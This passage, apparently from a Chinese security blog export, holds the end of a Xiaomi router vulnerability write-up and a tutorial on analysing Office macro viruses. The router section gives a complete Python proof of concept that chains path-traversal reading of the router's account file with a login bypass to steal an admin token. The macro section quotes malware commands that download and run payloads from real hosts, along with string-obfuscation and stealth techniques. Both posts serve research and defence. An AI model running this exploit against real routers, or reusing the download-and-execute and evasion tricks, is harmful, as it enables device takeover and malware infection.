<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sha1(nonce + sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</span><br><span class="line">&#x3D;&#x3D;</span><br><span class="line">sha1(nonce + accountStr)</span><br></pre></td></tr></table></figure>

<p>则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accountStr &#x3D;&#x3D; sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;)</span><br></pre></td></tr></table></figure>

<p>故，只需要读取<code>/etc/config/account</code>得到<code>accountStr</code>即可构造如下数据包登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;luci&#x2F;api&#x2F;xqsystem&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;sha1(nonce + account中保存的字符串)&amp;logtype&#x3D;2&amp;nonce&#x3D;0_mac地址_时间戳_5248</span><br></pre></td></tr></table></figure>

<p>实现任意登陆poc</p>
<p>arbitrary_file_read_vulnerability.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>():</span></span><br><span class="line">	<span class="comment">## get mac</span></span><br><span class="line">	r0 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/web&quot;</span>, proxies=proxies)</span><br><span class="line">	mac = re.findall(<span class="string">r&#x27;deviceId = \&#x27;(.*?)\&#x27;&#x27;</span>, r0.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="comment"># print(mac)	</span></span><br><span class="line">	<span class="keyword">return</span> mac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_account_str</span>():</span></span><br><span class="line">	<span class="comment">## read /etc/config/account</span></span><br><span class="line">	r1 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;</span>, proxies=proxies)</span><br><span class="line">	print(r1.text)</span><br><span class="line">	account_str = re.findall(<span class="string">r&#x27;admin\&#x27;? \&#x27;(.*)\&#x27;&#x27;</span>, r1.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">return</span> account_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nonce</span>(<span class="params">mac</span>):</span></span><br><span class="line">	type_ = <span class="number">0</span></span><br><span class="line">	deviceId = mac</span><br><span class="line">	time_ = int(time.time())</span><br><span class="line">	rand = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;%d_%s_%d_%d&quot;</span>%(type_, deviceId, time_, rand)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_password</span>(<span class="params">nonce, account_str</span>):</span></span><br><span class="line">	m = hashlib.sha1()</span><br><span class="line">	m.update((nonce + account_str).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	<span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line">mac = get_mac()</span><br><span class="line">account_str = get_account_str()</span><br><span class="line"><span class="comment">## login, get stok</span></span><br><span class="line">nonce = create_nonce(mac)</span><br><span class="line">password = calc_password(nonce, account_str)</span><br><span class="line">data = <span class="string">&quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;</span>.format(password=password,nonce=nonce)</span><br><span class="line">r2 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;</span>, </span><br><span class="line">	data = data, </span><br><span class="line">	headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;,</span><br><span class="line">	proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line">stok = re.findall(<span class="string">r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">&quot;stok=&quot;</span>+stok)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以获取到登录的stok</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904234409100.png" alt="image-20200904234409100"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>将<code>/etc/sysapihttpd/sysapihttpd.conf</code>中的形如以下形式修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx&#x2F; &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md">https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>XiaoMi</tag>
      </tags>
  </entry>
  <entry>
    <title>宏病毒的研究和学习</title>
    <url>/2018/06/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>宏病毒的研究和学习</strong></p>
<p><strong>1.绪论</strong></p>
<p>宏病毒是一种常见的计算机病毒，寄存在文档或者模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途径。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。</p>
<p>对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy）,工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是BlackEnergy，进来肆虐的各种各样的勒索软件，都离不开Office宏的帮助。借助传统的宏病毒，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行，释放并激活恶意软件</p>
<a id="more"></a>

<p><strong>2.基础知识</strong></p>
<p>宏（英文Macro），广义上的定义是：宏就是把一系列的指令组织成一独立的命令，类似C语言中#define宏定义，避免同一动作的一再重复；侠义上，宏特指office系列办公软件中的宏，Microsoft Office</p>
<p>中对宏的定义为“宏就是能够组织在一起的，可以作为一个独立命令来执行的一些列Word命令，他能使日常工作变得容易。”本文中提到的宏属于狭义的定义，即office办公软件中的宏。</p>
<p>首先office对于宏的管理如下图所示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16569.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16571.png" alt="0"></p>
<p>正常情况下offic会弹出相应的宏被禁用的通知，点击启用内容即可查看</p>
<p>或者按下ALT+F11也可以看到相应的宏程序</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16580.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16582.png" alt="0"></p>
<p>该例中的宏十分简单，其作用就是弹出一个对话框。</p>
<p>执行恶意功能的宏就是宏病毒</p>
<p>宏病毒是使用宏语言编写的恶意程序，存在于字处理文档、电子数据表格、数据库、演示文档等数据文件中，可以在office系列办公软件中运行，利用宏的功能能将自己复制到其他数据文件中。宏病毒感染的是数据文件。宏病毒于传统的病毒有很大的不同，他不感染可执行文件，而是潜伏在Microsoft Office文档中，一旦用户打开含有宏的文档，其中的宏就会被执行。宏是使用VBA编写的，编写过程简单，任何人只需掌握一些基本的宏编写技能就可以编写出破坏力巨大的宏病毒。</p>
<p>宏病毒的强大是建立在强大的VBA组件的基础上的。同时，宏病毒于系统平台无关，任何计算机如果能够运行Microsoft Office办公软件，都有可能感染宏病毒。随着Microsoft Office系列办公软件成为电子文档的工业标准，word，excel和powerpoint等已成为个人计算机和互联网上广泛使用的文档格式，宏病毒成为传播最广泛，危害最大的一类病毒。</p>
<p>根据文档载体的不同，宏病毒可以细分为很多种，Word、Excel、Access、PowerPoint等都有相应的宏病毒。</p>
<p><strong>2.2VB基础</strong></p>
<p>（1）sub与function</p>
<p>上述宏代码中，含有一个Sub和一个Function。sub和function都类似于C中的函数。sub在VB中被称为过程，function被称为函数；sub没有返回值，function有返回值；一段宏一定是从sub开始执行的。在demo3中定义了一个过程 autoopen()，“End Sub”表示这个过程的结束。</p>
<p>（2）VB基本函数</p>
<p>demo3 中“MsgBox ActiveDocument.BuiltInDocumentProperties(5)”调用了VB基本函数“MsgBox”，参数是”ActiveDocument.BuiltInDocumentProperties(5)”。这里实际上是“MsgBox (参数)”，但是VBA的容错率较高，不写括号，宏代码依然能够执行。即使我们将“MsgBox”写成“MSgbOx”，宏代码依然能够执行。一些宏病毒就是使用大小写混淆，增加病毒分析难度。</p>
<p>除了MsgBox，VB中还有很多基本函数，各位可以百度“VB函数大全”。</p>
<p>（3）对象</p>
<p>VB中存在很多对象，如Application对象，Document对象，Adobd.stream对象等。对象实际上是代码和数据的组合，我们在使用对象时，要么使用对象的属性（就是数据），要么使用对象的方法（就是代码）。通过 “对象.属性/方法”的方式使用对象的属性/方法。ActiveDocument.BuiltInDocumentProperties(5)中就是使用了ActiveDocument对象的BuiltInDocumentProperties()方法，参数是5。</p>
<p><strong>3.宏病毒实例分析</strong></p>
<p><strong>3.1 实例1</strong></p>
<p> demo2.doc    这里是社会工程学攻击</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16619.png" alt="0"></p>
<p>ALT+F11打开VBA编辑器，查看宏代码。但是你会发现，此时工程里没有数据，这是没有单击“启用内容”，VBA工程还没有加载</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16628.png" alt="0"></p>
<p>利用VBA_Password_Bypasser重新打开demo2.doc,再次打开VBA编辑器查看宏代码，宏代码一览无余：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16636.png" alt="0"></p>
<p>这段宏首先拼接了一段字符串CGJKIYRSDGHJHGFFG，这段字符串是一段命令，接下来就调用Shell() ，执行这段命令。</p>
<p>但是CGJKIYRSDGHJHGFFG的内容经过混淆，我们没办法一眼看出执行了什么命令，我们可以改造宏代码，使用Msgbox将CGJKIYRSDGHJHGFFG这段命令打印出来：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16640.png" alt="0"></p>
<p>现在就一目了然了，这段cmd命令执行了两段powershell命令，第一段powershell命令是从’<a href="http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。">http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，第二段powershell命令就是执行Y.ps1，关于Y.ps1的分析不属于宏病毒的范畴，这里就不做分析了。</a></p>
<p><strong>3.2 oledump.py</strong></p>
<p>在之前的分析中，我们先启用宏，然后打开VBA编辑器分析宏代码。这个时候我们不仅可以直观的看到宏代码，还可以动态调试。但是，我们选择启用宏后，宏代码就会运行，如果存在恶意行为，恶意行为就会执行。这样的分析方式存在一定的风险，那么，有没有一种方式，不运行宏就能查看宏代码呢？当然有，那就是oledump.py(<a href="https://github.com/decalage2/oledump-contrib)。">https://github.com/decalage2/oledump-contrib)。</a></p>
<p>oledump.py是一个用于分析OLE文件（复合文件二进制格式）的程序，我们可以使用它提取文档中的宏代码。其查找基于二进制文件格式的文件中的内容的流程：</p>
<p>  1.读取文件流。</p>
<p>  2.识别可能包含要查找的内容的结构。</p>
<p>  3.通过第一个结构，找到下一节的位置。</p>
<p>  4.在流中转到该节。</p>
<p>  5.重复前面两个步骤，直到找到所需的内容。</p>
<p>  6.读取并分析内容。</p>
<p>python oledump.py yangben.doc</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16652.png" alt="0"></p>
<p>这是oledump对doc文件的最基础的分析，显示了这个文件的Stream数据（在接下来的章节中我们会进行介绍Stream），一共包含18段，其中8这一段数据上标记了字母‘M’，表示这段数据中含有VBA宏（Macro）。</p>
<p>oledump.py有许多参数可以选择，使用oledump.py -m 可以查看oledump.py 的帮助信息，这里我们要用到的参数是-s和-v</p>
<p><strong>-s 段号：选择上分析出的某一段来查看内容</strong></p>
<p><strong>-v        ：解压缩VBA宏</strong></p>
<p>上面两个参数结合起来用就可以找出宏源码：</p>
<p>python oledump.py -s -A3 -v -yangben2.doc</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16683.png" alt="0"></p>
<p>可以看到宏代码被解析出来了。</p>
<p>在实际分析时，-s后的参数可以选择‘a’，表示分析所有段的数据，还可以使用‘&gt;’符号将宏代码数据存储在新文件中</p>
<p><strong>decoder_ay.py和-d参数</strong>，它可以将文件中的exe数据dump下来。有一些文档宏存储了exe数据，这个时候我们就可以使用下列命令，将文档中的exe数据导出：</p>
<p>python oledump.py -s 14  -D decoder_ay.py -d 1.doc  &gt;1.exe</p>
<p>如果我们只是想dump某一段数据，而不关心是不是exe数据，使用如下命令：</p>
<p>Oledump.py -s 段名 -d 文件名 &gt;新文件名</p>
<p><strong>4.宏病毒的分析技巧</strong></p>
<p><strong>4.1自动执行</strong></p>
<p>宏病毒分析的第一步是定位自动执行入口。</p>
<p>宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中宏病毒就会被执行，而用户一无所知。</p>
<p>宏病毒的激发机制有三种：利用自动运行的宏，修改Word命令和利用Document对象的事件。</p>
<p>宏病毒种常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如Subbotton()，当用户单击文档种的按钮控件时，宏自动执行；另一种则是Auto自动执行，如Sub AutoOpen()和Sub AutoClose(),分别在文档打开和关闭时自动执行</p>
<p><strong>4.2 隐秘执行</strong></p>
<p>宏病毒利用几行代码就可以实现隐秘，宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏：</p>
<p>On Error Resume Next                 //如果发生错误，不弹出错误对话框</p>
<p>Application.DisplayStatusBar = False     //进制显示状态栏</p>
<p>Options.SaveNormalPrompt = False    //修改公用模板时自动保存，不弹出提示</p>
<p>宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行种的宏，查看宏信息。</p>
<p>下面是一些宏病毒采取的隐蔽执行的一些措施：</p>
<table>
<thead>
<tr>
<th>外部例程</th>
<th>介绍</th>
</tr>
</thead>
<tbody><tr>
<td>MSXML2.ServerXMLHTTP</td>
<td>Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求</td>
</tr>
<tr>
<td>Net.WebClient</td>
<td>提供网络服务</td>
</tr>
<tr>
<td>Adodb.Stream</td>
<td>Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序</td>
</tr>
<tr>
<td>Wscript.shell</td>
<td>WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。</td>
</tr>
<tr>
<td>Poweshell</td>
<td>PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境</td>
</tr>
<tr>
<td>Application.Run</td>
<td>调用该函数，可以运行.exe文件</td>
</tr>
<tr>
<td>WMI</td>
<td>用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:\.\root\CIMV2隐藏启动进程</td>
</tr>
<tr>
<td>Shell.Application</td>
<td>能够执行sehll命令</td>
</tr>
</tbody></table>
<p>可以使用Wscript.shell实现命令执行功能：</p>
<p><strong>Set oWshell = CreateObject（“WScript.Shell”）</strong></p>
<p><strong>If ValueType = “” Then</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value</strong></p>
<p><strong>Else</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value</strong></p>
<p><strong>oWshell.RegWrite strkey,    Value,    ValueType</strong></p>
<p><strong>End If</strong></p>
<p>上表种Wscript.shell、Powersehll、Application.Run、Shell.Application这些外部例程都可以用来执行命令，初次之外，一些API如：Shell()、CallWindowProc()也常用执行命令。</p>
<p><strong>4.4 字符串隐写</strong></p>
<p>宏病毒分析比较简单，这是因为任何能执行宏的用户都能查看宏源码，分析人员轻而易举就分析出宏病毒的行为。通过扫描宏种特征字符串，杀软也很容易检测出宏病毒。宏病毒的开发者们便想尽办法隐藏这些特征字符串，下面本文就对宏病毒中这些字符串的隐写方式进行分析。</p>
<p><strong>4.4.1.Chr( )函数</strong></p>
<p>Chr(),返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’）</p>
<p>使用Chr函数是最常见的字符串隐写结束，利用ascii码，逃避字符串扫描。</p>
<p>如下列代码：</p>
<p>Nrh1INh1S5hGed = “h” &amp; Chr(116) &amp; Chr(61) &amp; “t” &amp; Chr(112) &amp;Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; “t” &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; “e” &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; “4” &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101)</p>
<p>上列代码使用了大量的Chr函数，看似很复杂，实际上就只是一串字符串“ht=tp:/;/chateau-d</p>
<p>Nrh1INh1S5hGed字符串看着很像一个链接，但是中间多了几个字符，其实处理起来很简单，只要将多余字符删掉就好。</p>
<p>将这串字符串命名为Nrh1INh1S5hGed也是为了混淆，但是对于宏病毒分析人员来说，这种混淆并没有增加分析难度，分析人员只需要 全选–查找–替换。</p>
<p>Chr（）函数还可以利用表达式，增加技术人员的分析难度：</p>
<p>Ndjs = Sgn(Asc(317 - 433) + 105）     </p>
<p>ATTH = Chr(Ndjs) + Chr(Ndjs + 12) + Chr(Ndjs + 12) + Chr(Ndjs + 8)</p>
<p>经过分析发现，上述代码的字符串是：“http：//”</p>
<p><strong>4.4.2.Replace( )函数</strong></p>
<p>Replace函数的作用就是替换字符串，返回一个新字符串，其中某个指定的字符串被另一个字符串代替。</p>
<p>承接上文，把Nrh1INh1S5hGed中多余字符去掉，这里使用Replace函数把多余字符替换为空。</p>
<p><strong>Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed,</strong></p>
<p>​                <strong>Chr(60), “”), Chr(61), “”), Chr(59), “”)</strong></p>
<p>处理之后：</p>
<p>Nrh1INh1S5hGed=“<a href="http://chateau-des-iles.com/4tf33w/w4t453.exe”">http://chateau-des-iles.com/4tf33w/w4t453.exe”</a></p>
<p>可以很清晰看出Nrh1INh1S5hGed是一个下载名为w4t453可执行文件的链接。可以猜测w4t453.exe是一个恶意程序，之后一定会执行w4t453.exe。在用户一无所知的情况下，宏已经完成了入侵工作。</p>
<p><strong>4.4.3.CallByname 函数</strong></p>
<p>CallByname函数允许使用一个字符串在运行时指定一个属性或方法。</p>
<p>CallByName    函数的用法如下：</p>
<p>Result = CallByName（Object， ProcedureName, CallType, Arguments()）</p>
<p>CallByName 的第一个参数包含要对其执行动作的对象名。第二个参数，ProcedureName,是第一个字符串，包含将要调用的方法或属性过程名。CallType参数包含一个常熟，代表要调用的过程的类型：方法（vbMethod）、property let (vbLet)、property get (vbGet),或 property set （vbSet）。最后一个参数是可选的，他包含一个变量数组，数组中包含该过程的参数。</p>
<p><strong>例如：</strong></p>
<p><strong>CallByName Text1, “Move”, vbMethod, 100, 100就相当于执行Text1.Move(100,10)</strong> 这种隐藏的函数执行增加了分析的难度。</p>
<p>CallByName的作用不仅仅在此，在下面的这个例子中，利用callByName，可以用脚本控制控件:</p>
<p>code：</p>
<p>Dim obj As Object[/align]        Set obj = Me</p>
<p>​       Set obj = CallByName(obj, “Text1”, VbGet)</p>
<p>​       Set obj = CallByName(obj, “Font”, VbGet)</p>
<p>​       CallByName obj, “Size”, VbLet, 50</p>
<p>​     ‘以上代码=”Me.Text1.Font.Size = 50”</p>
<p>​      Dim obj As Object</p>
<p>​       Dim V As String</p>
<p>​       Set obj = Me</p>
<p>​       Set obj = CallByName(obj, “Text1”, VbGet)</p>
<p>​       Set obj = CallByName(obj, “Font”, VbGet)</p>
<p>​       V = CallByName(obj, “Size”, VbGet)</p>
<p>​       ‘以上代码=”V = Me.Text1.Font.Size”</p>
<p><strong>4.4.4.Alias替换函数名</strong></p>
<p>Alias子句是一个可选的部分，用户可以通过它所标识的别名对动态库中的函数进行引用。</p>
<p><strong>Public Declare Function clothed Lib “user32” Alias “GetUpdateRect”</strong></p>
<p><strong>(prestigiation As Long, knightia As Long, otoscope As Long) As Boolean</strong></p>
<p>如上例所示，clothed作为GetUpdateRect的别名，调用clothed函数相当于调用user32库里的GetUpdateRect函数。</p>
<p>事实上喜欢使用别名的不仅仅是宏病毒制造者，普通的宏程序员也喜欢使用别名。使用别名的好处是比较明显的，一方面Visual Basic不允许调用以下划线为前缀的函数，然而在Win32 API函数中有大量C开发的函数可能以下划线开始。使用别名可以绕过这个限制。另外使用别名有利于用户命名标准统一。对于一些大小写敏感的函数名，使用别名可以改变函数的大小写。</p>
<p><strong>4.4.5.利用窗体、控件隐藏信息</strong></p>
<p>控件在宏程序里很常见，有些宏病毒的制造者们便想到利用控件隐藏危险字符串。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16842.png" alt="0"></p>
<p>如图所示，空间里存放着关键字符串，程序用到上述字符串时，只需要调用标签空间的caption属性</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16847.png" alt="0"></p>
<p>空间的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，分析者必须进入编辑器查看窗体属性，这大大增加了分析的难度。</p>
<p><strong>4.4.6.利用文件属性</strong></p>
<p>这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。</p>
<p>如图所示读取的时ActiveDocument。BuiltinDocumentProperties Comments的数据，实际上就是文件备注信息里的数据，将这里的数据Base解密并执行。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16865.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/16867.png" alt="0"></p>
<p><strong>4.5 恶意行为字符串</strong></p>
<p>不同的宏病毒执行不同的恶意行为，但这些恶意行为是类似的，他们使用的代码往往是相似的。通过大量的样本分析，笔者总结了一些宏病毒执行危险操作时代码中含有的字符串，详见下表：</p>
<table>
<thead>
<tr>
<th>字符串</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>http</td>
<td>URL连接</td>
</tr>
<tr>
<td>CallByName</td>
<td>允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用CallByName执行危险函数</td>
</tr>
<tr>
<td>Powershell</td>
<td>可以执行脚本，运行.exe文件，可以执行base64的命令</td>
</tr>
<tr>
<td>Winmgmts</td>
<td>WinMgmt.exe是Windows管理服务，可以创建windows管理脚本</td>
</tr>
<tr>
<td>Wscript</td>
<td>可以执行脚本命令</td>
</tr>
<tr>
<td>Shell</td>
<td>可以执行脚本命令</td>
</tr>
<tr>
<td>Environment</td>
<td>宏病毒用于获取系统环境变量</td>
</tr>
<tr>
<td>Adodb.stream</td>
<td>用于处理二进制数据流或文本流</td>
</tr>
<tr>
<td>Savetofile</td>
<td>结合Adodb.stream用于文件修改后保存</td>
</tr>
<tr>
<td>MSXML2</td>
<td>能够启动网络服务</td>
</tr>
<tr>
<td>XMLHTTP</td>
<td>能够启动网络服务</td>
</tr>
<tr>
<td>Application.Run</td>
<td>可以运行.exe文件</td>
</tr>
<tr>
<td>Download</td>
<td>文件下载</td>
</tr>
<tr>
<td>Write</td>
<td>文件写入</td>
</tr>
<tr>
<td>Get</td>
<td>http中get请求</td>
</tr>
<tr>
<td>Post</td>
<td>http中post请求</td>
</tr>
<tr>
<td>Response</td>
<td>http中认识response回复</td>
</tr>
<tr>
<td>Net</td>
<td>网络服务</td>
</tr>
<tr>
<td>WebClient</td>
<td>网络服务</td>
</tr>
<tr>
<td>Temp</td>
<td>常被宏病毒用于获取临时文件夹</td>
</tr>
<tr>
<td>Process</td>
<td>启动进程</td>
</tr>
<tr>
<td>Cmd</td>
<td>执行控制台命令</td>
</tr>
<tr>
<td>createObject</td>
<td>宏病毒常用于创建进行危险行为的对象</td>
</tr>
<tr>
<td>Comspec</td>
<td>%ComSpec%一般指向你cmd.exe的路径</td>
</tr>
</tbody></table>
<p><strong>5 宏病毒的防御手段</strong></p>
<p>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒，除此这些常规手段之外，宏病毒还有专门的防止措施。</p>
<p><strong>5.1 禁用宏</strong></p>
<p>由于宏病毒的肆虐，Microsoft不得不在Office办公软件中提供了禁止宏的功能，用户只需要将其打开激活即可再次运行宏。以word2013为例，禁用宏的方法是：单击开发工具菜单下的“宏”，单击“宏安全性”，在随后的出现的对话框中选择“禁用所有宏，并发出通知”。</p>
<p>这个方法一度被认为能防住所有的宏病毒，但是总会有0day能够绕过宏防护，禁用宏对于利用漏洞绕过宏禁用功能的宏病毒，仍然无能为力。</p>
<p>而且禁用宏功能还有两个很大的缺陷：一是它拒绝了一切的宏执行，并不区分正常的宏和还是病毒宏，这会造成某些文档无法打开或出错；二是宏病毒防护无法阻止启动word时Autoexec.DOT中的宏和Normal.DOT中的宏自动执行。</p>
<p><strong>5.2 越过自动宏</strong></p>
<p>如果怀疑文档中存在宏病毒，可以在Office打开文档的时候，始终按住Shift键，将进制存在的一起自动宏。这和禁止宏有异曲同工之妙，Shift键可以在退出时禁止任何AutoClose宏。这种方法的缺陷也很明显，它只能对付一时，当宏病毒利用其他菜单选项来实现破环活动，这种方法就不再有效</p>
<p><strong>5.3恢复被宏病毒破坏的文档</strong></p>
<p>对于普通用户来说，清理宏病毒显得麻烦，因为文档被宏病毒感染后（实际上是文档使用的模板文档被感染），使用文档时常常会出现一些异常情况，即使用杀毒软件将所有带毒的文档文件都处理一遍，但是，当重新打开它们时病毒又出现了。有些用户采用的是将Office卸载重装，但是有时候问题还是没有被解决。</p>
<p>其实，对于宏病毒的清理并不难，下面以删除Word宏病毒为例分步骤详细说明：</p>
<p>①　退出Word程序，先查看系统盘根目录下是否存在Autoexec.DOT文件，如果存在，而又不知道它是什么时候出现，则将其删除。</p>
<p>②　然后找到Normal.DOT文件，一般位于C:\Documents and Settings\ Administrator\Application Data\Microsoft\Templates目录下，用先前干净的备份将其替换，也可以直接删除，Word不会因为找不到Normal.DOT而拒绝启动，它会自动重新生成一个干净的没有任何外来宏的Noraml.DOT。</p>
<p>③　查看Noraml.DOT所在的目录中是否存在其他模板文件，如果存在且不是自己复制进去的，将其删除。</p>
<p>④　重新启动Word程序，查看Word是否恢复正常了。</p>
<p>⑤　最后检查宏病毒防护是否被启用了，某些病毒会自动禁用宏病毒防护功能，如果不启用禁用宏功能，Word会很快再次被病毒感染。</p>
<p>目前主流杀软在处理宏病毒时，都是直接删除含有宏病毒的文档，这样处理显得有些粗暴，将导致用户无法查看文档里的数据，如果时一些重要的业务数据，将造成业务数据的丢失，产生无法估计的后果。本文将介绍一种宏病毒处理思路，在不删除文档文件的情况下清楚宏病毒。在正式处理宏病毒前，我们必须对Office文档的数据结构以及宏的数据结构有着初步的了解</p>
